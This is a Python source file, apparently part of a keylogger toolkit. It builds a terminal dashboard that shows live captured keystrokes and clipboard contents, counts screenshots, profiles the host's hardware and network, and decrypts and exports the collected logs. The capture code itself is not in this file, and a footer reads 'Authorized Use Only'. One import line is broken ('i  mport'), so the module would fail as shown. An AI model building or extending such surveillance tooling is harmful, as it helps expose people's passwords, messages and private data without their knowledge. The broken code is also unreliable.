import time
import threading
from datetime import datetime, timedelta

# pyrefly: ignore [missing-import]
from rich.console import Console
# pyrefly: ignore [missing-import]
from rich.layout import Layout
# pyrefly: ignore [missing-import]
from rich.panel i  mport Panel
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.align import Align
# pyrefly: ignore [missing-import]
from rich.progress import (
    Progress,
    BarColumn,
    TextColumn, 
    SpinnerColumn,
)
# pyrefly: ignore [missing-import]
from rich.columns import Columns
from rich.rule import Rule
from rich import box

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from config.settings import (
    APP_NAME,
    APP_VERSION,
    APP_TAGLINE,
    BANNER,
    SESSION_ID,
    THEME_PRIMARY,
    THEME_SECONDARY,
    THEME_ACCENT,
    THEME_WARNING,
    THEME_ERROR,
    DASHBOARD_REFRESH_RATE,
    MAX_DISPLAY_KEYS,
    AUTO_STOP_HOURS,
)

console = Console()

class Dashboard:

    def __init__(self, keylogger=None, clipboard=None, screenshot=None, encryption=None):
        self.keylogger = keylogger
        self.clipboard = clipboard
        self.screenshot = screenshot
        self.encryption = encryption
        self._running = False

    def show_banner(self):
        banner_text = Text(BANNER, style=f"bold {THEME_PRIMARY}")
        console.print(
            Panel(
                Align.center(banner_text),
                border_style=THEME_PRIMARY,
                box=box.DOUBLE,
                padding=(0, 2),
            )
        )
        console.print(
            Align.center(
                Text(
                    f"  {APP_TAGLINE}  •  v{APP_VERSION}  ",
                    style=f"bold {THEME_SECONDARY}",
                )
            )
        )
        console.print()

    def show_system_info(self, profiler):
        profile = profiler.collect_all()
        os_info = profile["os_info"]
        hw = profile["hardware"]
        net = profile["network"]

        table = Table(
            title="🖥️  System Profile",
            box=box.ROUNDED,
            border_style=THEME_PRIMARY,
            title_style=f"bold {THEME_PRIMARY}",
            show_header=True,
            header_style=f"bold {THEME_SECONDARY}",
            padding=(0, 1),
        )
        table.add_column("Property", style=f"bold {THEME_ACCENT}", min_width=20)
        table.add_column("Value", style="white", min_width=35)

        table.add_row("🏗️  OS", f"{os_info['system']} {os_info['release']}")
        table.add_row("📐 Architecture", f"{os_info['architecture']} ({os_info['machine']})")
        table.add_row("⚙️  Processor", os_info['processor'][:50])
        table.add_row("🧠 CPU Cores", f"{hw.get('cpu_count_physical', '?')} physical / {hw['cpu_count_logical']} logical")
        table.add_row("💾 RAM", f"{hw.get('ram_total_gb', '?')} GB ({hw.get('ram_usage_percent', '?')}% used)")
        table.add_row("💿 Disk", f"{hw.get('disk_total_gb', '?')} GB ({hw.get('disk_usage_percent', '?')}% used)")
        table.add_row("🌐 Hostname", net['hostname'])
        table.add_row("📍 Local IP", net.get('local_ip', 'N/A'))
        table.add_row("🐍 Python", os_info['python_version'])
        table.add_row("📡 Net Sent", f"{net.get('bytes_sent_mb', '?')} MB")
        table.add_row("📡 Net Recv", f"{net.get('bytes_recv_mb', '?')} MB")

        console.print()
        console.print(table)
        console.print()

    def show_log_review(self, file_handler):
        files = file_handler.list_log_files()

        table = Table(
            title="📂  Log Files",
            box=box.ROUNDED,
            border_style=THEME_PRIMARY,
            title_style=f"bold {THEME_PRIMARY}",
            show_header=True,
            header_style=f"bold {THEME_SECONDARY}",
        )
        table.add_column("#", style="dim", width=4, justify="right")
        table.add_column("Filename", style=f"bold {THEME_ACCENT}", min_width=30)
        table.add_column("Size", style="white", width=12, justify="right")
        table.add_column("Modified", style="white", width=20)
        table.add_column("Encrypted", width=10, justify="center")

        if not files:
            table.add_row("", "[dim]No log files found[/]", "", "", "")
        else:
            for i, f in enumerate(files, 1):
                enc_badge = (
                    f"[bold {THEME_ACCENT}]✅ Yes[/]"
                    if f["encrypted"]
                    else f"[bold {THEME_WARNING}]❌ No[/]"
                )
                table.add_row(
                    str(i),
                    f["filename"],
                    f"{f['size_kb']} KB",
                    f["modified"],
                    enc_badge,
                )

        console.print()
        console.print(table)

        stats = file_handler.get_storage_stats()
        console.print(
            f"\n  [dim]📁 Total: {stats['total_files']} files  |  "
            f"💾 Size: {stats['total_size_mb']} MB  |  "
            f"📂 Dir: {stats['log_directory']}[/]"
        )
        console.print()

    def start_live_monitor(self):
        self._running = True

        try:
            with Live(
                self._generate_layout(),
                console=console,
                refresh_per_second=1,
                screen=False,
                vertical_overflow="ellipsis",
            ) as live:
                while self._running:
                    try:
                        live.update(self._generate_layout())
                        time.sleep(DASHBOARD_REFRESH_RATE)
                    except KeyboardInterrupt:
                        self._running = False
                        break
                    except Exception:
                        time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self._running = False

    def stop(self):
        self._running = False

    def _generate_layout(self) -> Layout:
        layout = Layout()

        layout.split_column(
            Layout(name="header", size=5),
            Layout(name="body", ratio=1),
            Layout(name="footer", size=3),
        )

        layout["body"].split_row(
            Layout(name="left", ratio=2),
            Layout(name="right", ratio=1),
        )

        layout["left"].split_column(
            Layout(name="keystroke_panel", ratio=3),
            Layout(name="clipboard_panel", ratio=1),
        )

        layout["right"].split_column(
            Layout(name="stats_panel", ratio=2),
            Layout(name="modules_panel", ratio=1),
            Layout(name="system_panel", ratio=1),
        )

        layout["header"].update(self._render_header())
        layout["keystroke_panel"].update(self._render_keystroke_panel())
        layout["clipboard_panel"].update(self._render_clipboard_panel())
        layout["stats_panel"].update(self._render_stats_panel())
        layout["modules_panel"].update(self._render_modules_panel())
        layout["system_panel"].update(self._render_system_panel())
        layout["footer"].update(self._render_footer())

        return layout

    def _render_header(self) -> Panel:
        now = datetime.now()

        elapsed = ""
        if self.keylogger and self.keylogger.start_time:
            delta = now - self.keylogger.start_time
            hours, remainder = divmod(int(delta.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            elapsed = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

        header = Text()
        header.append("  🛡️  ", style="bold")
        header.append(APP_NAME, style=f"bold {THEME_PRIMARY}")
        header.append(f"  v{APP_VERSION}", style="dim")
        header.append("  │  ", style="dim")
        header.append("⏱  ", style="bold")
        header.append(elapsed or "00:00:00", style=f"bold {THEME_ACCENT}")
        header.append("  │  ", style="dim")
        header.append("📅  ", style="bold")
        header.append(now.strftime("%Y-%m-%d %H:%M:%S"), style="white")
        header.append("  │  ", style="dim")
        header.append("🔑  ", style="bold")
        header.append(f"Session: {SESSION_ID}", style=f"dim {THEME_SECONDARY}")

        status = (
            f"[bold {THEME_ACCENT}]● MONITORING ACTIVE[/]"
            if (self.keylogger and self.keylogger.is_running)
            else f"[bold {THEME_ERROR}]● STOPPED[/]"
        )

        return Panel(
            Align.center(header),
            subtitle=status,
            border_style=THEME_PRIMARY,
            box=box.HEAVY,
            padding=(0, 1),
        )

    def _render_keystroke_panel(self) -> Panel:
        if not self.keylogger:
            content = Text("[dim]Keylogger not initialized[/]", justify="center")
        else:
            recent = self.keylogger.get_recent_keys(MAX_DISPLAY_KEYS)
            if recent:
                text = Text()
                for key in recent:
                    if key.startswith(" [") and key.endswith("] "):
                        text.append(key, style=f"bold {THEME_SECONDARY}")
                    elif key == " [ENTER]\n":
                        text.append(" ↵\n", style=f"bold {THEME_WARNING}")
                    elif key == " [SPACE] ":
                        text.append("·", style="dim")
                    elif key == " [BACKSPACE] ":
                        text.append("⌫", style=f"bold {THEME_ERROR}")
                    else:
                        text.append(key, style=f"bold {THEME_ACCENT}")
                content = text
            else:
                content = Text(
                    "Waiting for keystrokes...\n\n"
                    "Start typing to see live capture here.",
                    style="dim italic",
                    justify="center",
                )

        return Panel(
            content,
            title=f"[bold {THEME_PRIMARY}]⌨️  Live Keystroke Capture[/]",
            border_style=THEME_PRIMARY,
            box=box.ROUNDED,
            padding=(1, 2),
        )

    def _render_clipboard_panel(self) -> Panel:
        if not self.clipboard:
            content = Text("[dim]Clipboard monitor not initialized[/]", justify="center")
        else:
            entries = self.clipboard.get_recent_entries(5)
            if entries:
                table = Table(
                    box=None,
                    show_header=True,
                    header_style=f"bold {THEME_SECONDARY}",
                    padding=(0, 1),
                    expand=True,
                )
                table.add_column("Time", style="dim", width=10)
                table.add_column("Content", style="white", ratio=1)

                for entry in reversed(entries):
                    ts = entry["timestamp"].split("T")[1][:8]
                    content_preview = entry["content"][:60]
                    if len(entry["content"]) > 60:
                        content_preview += "..."
                    table.add_row(ts, content_preview)
                content = table
            else:
                content = Text(
                    "No clipboard changes detected yet...",
                    style="dim italic",
                    justify="center",
                )

        return Panel(
            content,
            title=f"[bold {THEME_SECONDARY}]📋  Clipboard Monitor[/]",
            border_style=THEME_SECONDARY,
            box=box.ROUNDED,
            padding=(0, 1),
        )

    def _render_stats_panel(self) -> Panel:
        table = Table(
            box=None,
            show_header=False,
            padding=(0, 1),
            expand=True,
        )
        table.add_column("Metric", style=f"bold {THEME_ACCENT}", width=20)
        table.add_column("Value", style="bold white", justify="right")

        if self.keylogger:
            stats = self.keylogger.get_stats()
            elapsed = stats["elapsed_seconds"]
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)

            table.add_row("⌨️  Total Keys", f"{stats['total_keystrokes']:,}")
            table.add_row("⚡ Keys/Minute", f"{stats['keys_per_minute']}")
            table.add_row("⏱  Duration", f"{hours}h {minutes}m {seconds}s")
            table.add_row("📦 Buffer", f"{stats['buffer_size']}")
            table.add_row("", "")

        if self.clipboard:
            cb_stats = self.clipboard.get_stats()
            table.add_row("📋 Clip Captures", f"{cb_stats['total_captures']}")

        if self.screenshot:
            ss_stats = self.screenshot.get_stats()
            table.add_row("📸 Screenshots", f"{ss_stats['total_captures']}")

        if self.encryption:
            enc_status = self.encryption.get_status()
            enc_icon = (
                f"[{THEME_ACCENT}]🔒 Active[/]"
                if enc_status["enabled"]
                else f"[{THEME_ERROR}]🔓 Disabled[/]"
            )
            table.add_row("🔐 Encryption", enc_icon)

        return Panel(
            table,
            title=f"[bold {THEME_ACCENT}]📊  Session Statistics[/]",
            border_style=THEME_ACCENT,
            box=box.ROUNDED,
            padding=(1, 1),
        )

    def _render_modules_panel(self) -> Panel:
        table = Table(
            box=None,
            show_header=True,
            header_style=f"bold {THEME_SECONDARY}",
            padding=(0, 1),
            expand=True,
        )
        table.add_column("Module", style="bold white", ratio=1)
        table.add_column("Status", width=12, justify="center")

        kl_running = self.keylogger and self.keylogger.is_running
        kl_status = (
            f"[bold {THEME_ACCENT}]● ON[/]"
            if kl_running
            else f"[bold {THEME_ERROR}]● OFF[/]"
        )
        table.add_row("⌨️  Keylogger", kl_status)

        cb_running = self.clipboard and self.clipboard.is_running
        cb_status = (
            f"[bold {THEME_ACCENT}]● ON[/]"
            if cb_running
            else f"[bold {THEME_ERROR}]● OFF[/]"
        )
        table.add_row("📋 Clipboard", cb_status)

        ss_running = self.screenshot and self.screenshot.is_running
        ss_status = (
            f"[bold {THEME_ACCENT}]● ON[/]"
            if ss_running
            else f"[bold {THEME_ERROR}]● OFF[/]"
        )
        table.add_row("📸 Screenshot", ss_status)

        enc_active = self.encryption and self.encryption.enabled
        enc_status = (
            f"[bold {THEME_ACCENT}]● ON[/]"
            if enc_active
            else f"[bold {THEME_ERROR}]● OFF[/]"
        )
        table.add_row("🔐 Encryption", enc_status)

        return Panel(
            table,
            title=f"[bold {THEME_WARNING}]🔌  Module Status[/]",
            border_style=THEME_WARNING,
            box=box.ROUNDED,
            padding=(0, 1),
        )

    def _render_system_panel(self) -> Panel:
        table = Table(
            box=None,
            show_header=False,
            padding=(0, 1),
            expand=True,
        )
        table.add_column("Resource", style=f"bold {THEME_ACCENT}", ratio=1)
        table.add_column("Usage", style="white", width=18, justify="right")

        if PSUTIL_AVAILABLE:
            cpu = psutil.cpu_percent(interval=0)
            mem = psutil.virtual_memory()

            cpu_bar = self._make_bar(cpu)
            mem_bar = self._make_bar(mem.percent)

            table.add_row("🧠 CPU", f"{cpu_bar} {cpu:5.1f}%")
            table.add_row("💾 RAM", f"{mem_bar} {mem.percent:5.1f}%")
        else:
            table.add_row("System", "[dim]psutil unavailable[/]")

        return Panel(
            table,
            title=f"[bold {THEME_PRIMARY}]💻  Resources[/]",
            border_style=THEME_PRIMARY,
            box=box.ROUNDED,
            padding=(0, 1),
        )

    def _render_footer(self) -> Panel:
        footer = Text()
        footer.append("  [Ctrl+C] ", style=f"bold {THEME_WARNING}")
        footer.append("Stop Monitoring", style="white")
        footer.append("  │  ", style="dim")
        footer.append(f"Auto-stop in {AUTO_STOP_HOURS}h", style="dim")
        footer.append("  │  ", style="dim")
        footer.append("⚖️  Authorized Use Only", style=f"bold {THEME_WARNING}")

        return Panel(
            Align.center(footer),
            border_style="dim",
            box=box.SIMPLE,
            padding=(0, 0),
        )

    @staticmethod
    def _make_bar(percent: float, width: int = 8) -> str:
        filled = int(width * percent / 100)
        empty = width - filled

        if percent > 80:
            color = "red"
        elif percent > 60:
            color = "yellow"
        else:
            color = "green"

        return f"[{color}]{'█' * filled}{'░' * empty}[/{color}]"

    def show_decrypt_menu(self, file_handler):
        console.print()
        console.print(
            Rule(
                f"[bold {THEME_PRIMARY}]🔓 Decrypt & Export Logs[/]",
                style=THEME_PRIMARY,
            )
        )

        files = file_handler.list_log_files()
        encrypted_files = [f for f in files if f["encrypted"]]

        if not encrypted_files:
            console.print(
                f"\n  [bold {THEME_WARNING}]No encrypted log files found.[/]\n"
            )
            return

        self.show_log_review(file_handler)

        console.print(
            f"\n  [{THEME_ACCENT}]Export formats:[/]"
            f"\n    [bold]1.[/] TXT  - Plaintext readable format"
            f"\n    [bold]2.[/] CSV  - Spreadsheet compatible"
            f"\n    [bold]3.[/] JSON - Structured data format"
        )

        try:
            choice = console.input(
                f"\n  [{THEME_PRIMARY}]Select format (1/2/3): [/]"
            ).strip()
        except (KeyboardInterrupt, EOFError):
            return

        format_map = {"1": "txt", "2": "csv", "3": "json"}
        export_format = format_map.get(choice, "txt")

        console.print(
            f"\n  [bold {THEME_ACCENT}]⏳ Exporting as {export_format.upper()}...[/]"
        )

        output = file_handler.export_logs(output_format=export_format)

        console.print(
            f"  [bold {THEME_ACCENT}]✅ Exported to: {output}[/]\n"
        )
